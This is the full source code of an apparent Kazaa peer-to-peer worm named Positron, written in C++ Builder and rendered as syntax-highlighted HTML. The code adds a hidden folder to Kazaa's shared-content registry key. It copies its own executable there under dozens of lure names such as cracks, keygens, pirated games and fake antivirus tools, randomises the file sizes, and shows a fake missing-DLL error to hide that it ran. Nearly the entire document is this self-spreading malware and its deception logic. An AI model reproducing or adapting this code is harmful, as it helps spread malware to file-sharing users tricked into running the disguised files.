<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Worm.P2P.Positron - VB.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//---------------------------------------------------------------------------
</span><span class="sc9">#include &lt;vcl.h&gt;
#include &lt;Registry.hpp&gt;
#pragma hdrstop
#include "VB.h"
#include "stdlib.h"
#include "stdio.h"
#include "io.h"
#include "fcntl.h"
</span><span class="sc2">//---------------------------------------------------------------------------
</span><span class="sc9">#pragma package(smart_init)
#pragma resource "*.dfm"
</span><span class="sc11">TForm1</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Form1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">//---------------------------------------------------------------------------
</span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">TForm1</span><span class="sc10">::</span><span class="sc11">TForm1</span><span class="sc10">(</span><span class="sc11">TComponent</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Owner</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TForm</span><span class="sc10">(</span><span class="sc11">Owner</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//---------------------------------------------------------------------------
</span><span class="sc0">
</span><span class="sc11">AnsiString</span><span class="sc0"> </span><span class="sc11">SysConfigDir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"C:\\Windows\\Kazaa"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">AnsiString</span><span class="sc0"> </span><span class="sc11">Fake</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">FakeFiles</span><span class="sc10">[</span><span class="sc4">97</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                         </span><span class="sc6">"CKY3 - Bam Margera World Industries Alien Workshop"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Cat Attacks Child"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Windows XP"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"AIM Account Stealer"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"MSN Password Hacker and Stealer"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Hacking Tool Collection"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Macromedia Flash 5.0"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"DSL Modem Uncapper"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Internet and Computer Speed Booster"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"ZoneAlarm Firewall"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Borland Delphi 6"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"BORLAND Delphi 7"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Shakira"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Gladiator"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"AikaQuest3Hentai"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"MoviezChannelsInstaler"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Zidane-ScreenInstaler"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"LordOfTheRingsr"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"SIMS"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Quake 4 BETA"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Xbox.info"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"GTA3"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Battle.net"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Warcraft 3 battle.net"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Half-life WON"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Winzip 8.0"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Winrar 3.2"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Warcraft 3 ONLINE"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Half-life ONLINE"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Grand Theft Auto 3"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Macromedia"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"KaZaA Media Desktop v2.5 UNOFFICIAL"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"KaZaA Spyware Remover"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Age Of Empires 2"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Norton AntiVirus 2002"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Macromedia Dreamweaver MX"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Microsoft Office XP (English)"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"CloneCD"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Windows XP SP1"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"The Neverending Story Part I"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Free Virus Removal Tool From Symantec"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"The Sun Of All Fears"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Crazy Taxi"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Duke Nukem Manhattan Project"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Industry Giant 2"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"F1 Grand Pix 4"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Star Wars II Movie"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Nero Burning Rom 5.8.0.1"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Need For Speed 5 Porsche Unleashed"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Half Life Blue Shift"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Quake 3 Arena"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Warcraft 3"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Civilization 3"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Black And White"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Strike Fighter Project 1"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Mafia"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"The Eye Of Kraken"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Hoyle Card Games 2003"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"GTA 3"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Hard Truck 18 Wheels of Steel"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Comanche 4"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Grand Prix 4"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Age of Sail 2"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Sudden Strike 2"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Neverwinter Nights"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Soldier Of Fortune 2"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Valhalla Chronicles"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"International Cricket Captain 2003"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Critical Point Manga game"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Elder Scrolls III Morrowind THX Brrbrr"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Unreal Tournament 3"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Aliens versus Predator 2 Primal Hunt"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Star Wars Starfighter"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Norton Utilities 2002 XP"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Hitman 2 Silent Assassin"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"MS Train Simulator"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Cabelas Ultimate Deer Hunt 2"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Dweebs 2"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Age Of Wonders 2"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Austerlitz Napoleons Greatest Victory"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Emperor Rise Of the Middle Kingdom"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Necromania Trap Of Darkness"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Prisoner Of War"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Squad Battles Eagles Strike"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Stronghold Crusader"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Tomb Raider 3"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Deadly Dozen"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Empire Earth"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Freedom Force"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Gearhead Garage"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Red Ace Squadron"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Clive Barker’s Undying"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"The Thing"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Dark Age Of Camelot Shrouded Isles"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Combat Flight Simulator 3"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Soldiers Of Anarchy"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"FIFA 2003"</span><span class="sc0">
                      </span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Addon</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                         </span><span class="sc6">"Crack"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Patch"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Key Generator"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Full Downloader"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"ISO - Full Downloader"</span><span class="sc10">,</span><span class="sc0">
                         </span><span class="sc6">"Downloader"</span><span class="sc0">
                  </span><span class="sc10">};</span><span class="sc0">

</span><span class="sc2">//---------------------------------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">RandomFileName</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">AnsiString</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">doub</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">50</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">Fake</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">do</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">doub</span><span class="sc10">=</span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc10">=</span><span class="sc11">FakeFiles</span><span class="sc10">[</span><span class="sc11">random</span><span class="sc10">(</span><span class="sc4">96</span><span class="sc10">)];</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc10">=</span><span class="sc11">s</span><span class="sc10">+</span><span class="sc6">" "</span><span class="sc10">+</span><span class="sc11">Addon</span><span class="sc10">[</span><span class="sc11">random</span><span class="sc10">(</span><span class="sc4">5</span><span class="sc10">)]+</span><span class="sc6">".exe"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">j</span><span class="sc10">&lt;</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">==</span><span class="sc11">Fake</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc11">doub</span><span class="sc10">=</span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Fake</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">doub</span><span class="sc10">==</span><span class="sc5">false</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">50</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//---------------------------------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">ManipulateFileSize</span><span class="sc10">(</span><span class="sc11">AnsiString</span><span class="sc0"> </span><span class="sc11">SharedDir</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">RandomBytes</span><span class="sc10">[</span><span class="sc4">1000</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">AnsiString</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">o</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">x</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">FakeFile</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Handle</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">1000</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc11">RandomBytes</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">random</span><span class="sc10">(</span><span class="sc4">255</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">50</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc10">=</span><span class="sc11">SharedDir</span><span class="sc10">+</span><span class="sc6">"\\"</span><span class="sc10">+</span><span class="sc11">Fake</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FileExists</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">Handle</span><span class="sc10">=</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc11">O_RDWR</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">chsize</span><span class="sc10">(</span><span class="sc11">Handle</span><span class="sc10">,</span><span class="sc4">36352</span><span class="sc10">+</span><span class="sc11">random</span><span class="sc10">(</span><span class="sc4">10000</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">FakeFile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//---------------------------------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">MakeFakeFiles</span><span class="sc10">(</span><span class="sc11">AnsiString</span><span class="sc0"> </span><span class="sc11">SharedDir</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">I</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">AnsiString</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">,</span><span class="sc11">f</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SharedDir</span><span class="sc10">!=</span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">RandomFileName</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">CreateDir</span><span class="sc10">(</span><span class="sc11">SharedDir</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">I</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">I</span><span class="sc10">&lt;</span><span class="sc4">50</span><span class="sc10">;</span><span class="sc11">I</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">e</span><span class="sc10">=</span><span class="sc11">ParamStr</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">f</span><span class="sc10">=</span><span class="sc11">SharedDir</span><span class="sc10">+</span><span class="sc6">"\\"</span><span class="sc10">+</span><span class="sc11">Fake</span><span class="sc10">[</span><span class="sc11">I</span><span class="sc10">];</span><span class="sc0">
      </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">e</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc5">false</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">ManipulateFileSize</span><span class="sc10">(</span><span class="sc11">SharedDir</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//---------------------------------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">FindKazaa</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">TRegistry</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Registry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">TRegistry</span><span class="sc10">(</span><span class="sc11">KEY_READ</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Registry</span><span class="sc10">-&gt;</span><span class="sc11">RootKey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc11">Registry</span><span class="sc10">-&gt;</span><span class="sc11">KeyExists</span><span class="sc10">(</span><span class="sc6">"Software\\Kazaa"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Registry</span><span class="sc10">-&gt;</span><span class="sc11">CloseKey</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc5">delete</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//---------------------------------------------------------------------------
</span><span class="sc0">
</span><span class="sc11">AnsiString</span><span class="sc0"> </span><span class="sc11">KazaaShare</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">AnsiString</span><span class="sc0"> </span><span class="sc11">Dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">WinPath</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">I</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">TRegistry</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Registry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">TRegistry</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Registry</span><span class="sc10">-&gt;</span><span class="sc11">RootKey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Registry</span><span class="sc10">-&gt;</span><span class="sc11">OpenKey</span><span class="sc10">(</span><span class="sc6">"\\Software\\Kazaa\\LocalContent\\"</span><span class="sc10">,</span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">do</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Dir</span><span class="sc10">=</span><span class="sc11">IntToStr</span><span class="sc10">(</span><span class="sc11">I</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">Dir</span><span class="sc10">=</span><span class="sc6">"Dir"</span><span class="sc10">+</span><span class="sc11">Dir</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">I</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc10">=</span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Registry</span><span class="sc10">-&gt;</span><span class="sc11">ValueExists</span><span class="sc10">(</span><span class="sc11">Dir</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">=</span><span class="sc11">Registry</span><span class="sc10">-&gt;</span><span class="sc11">ReadString</span><span class="sc10">(</span><span class="sc11">Dir</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">s</span><span class="sc10">!=</span><span class="sc6">""</span><span class="sc10">)&amp;(</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Pos</span><span class="sc10">(</span><span class="sc11">SysConfigDir</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">==</span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">-&gt;</span><span class="sc11">WriteString</span><span class="sc10">(</span><span class="sc11">Dir</span><span class="sc10">,</span><span class="sc6">"012345:"</span><span class="sc10">+</span><span class="sc11">WinPath</span><span class="sc10">+</span><span class="sc11">SysConfigDir</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Registry</span><span class="sc10">-&gt;</span><span class="sc11">CloseKey</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc5">delete</span><span class="sc0"> </span><span class="sc11">Registry</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">WinPath</span><span class="sc10">+</span><span class="sc11">SysConfigDir</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//---------------------------------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__fastcall</span><span class="sc0"> </span><span class="sc11">TForm1</span><span class="sc10">::</span><span class="sc11">FormCreate</span><span class="sc10">(</span><span class="sc11">TObject</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">Sender</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">AnsiString</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"Positron Positron Positron Positron Positron Positron Positron"</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Randomize</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">KazaaShare</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc11">MakeFakeFiles</span><span class="sc10">(</span><span class="sc11">SysConfigDir</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Application</span><span class="sc10">-&gt;</span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc6">"Can not find MSVBDLL32.DLL"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ERROR"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc11">EXIT_SUCCESS</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//---------------------------------------------------------------------------
</span></div></body>
</html>
